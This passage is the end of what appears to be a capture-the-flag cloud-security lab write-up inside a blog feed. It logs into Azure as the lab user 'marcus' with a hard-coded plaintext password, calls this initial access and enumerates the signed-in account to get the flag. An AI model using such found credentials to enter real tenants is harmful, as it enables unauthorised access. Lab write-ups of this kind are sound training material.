+</code></pre><h2 id="connecting-to-azure">Connecting to Azure</h2>
+<p>To interact with Azure, I&rsquo;m using Az Powershell. You can install it with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Install-Module</span> -Name Az -Scope CurrentUser -Repository PSGallery -Force
+</span></span></code></pre></div><p>Logging in as Marcus:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Username <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;marcus@megabigtech.com&#34;</span>
+</span></span><span style="display:flex;"><span>$Password <span style="color:#eceff4">=</span> <span style="color:#a3be8c">&#34;TheEagles12345!&#34;</span> <span style="color:#eceff4">|</span> <span style="color:#81a1c1">ConvertTo-SecureString</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$Credential <span style="color:#eceff4">=</span> <span style="color:#81a1c1">New-Object</span> System<span style="color:#eceff4">.</span><span style="color:#8fbcbb">Management</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">Automation</span><span style="color:#eceff4">.</span><span style="color:#8fbcbb">PSCredential</span> <span style="color:#eceff4">(</span>$Username<span style="color:#eceff4">,</span> $Password<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">Connect-AzAccount</span> -Credential $Credential 
+</span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240815174158.png" alt=""></p>
+<p>Achieved inital access. Let&rsquo;s check the details for this account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#81a1c1">Get-AzADUser</span> -SignedIn <span style="color:#eceff4">|</span> <span style="color:#81a1c1">fl
+</span></span></span></code></pre></div><p><img src="/img/archive/Pasted%20image%2020240815174436.png" alt=""></p>
+<p>And we get the flag!</p>
 ]]></content>
         </item>
         
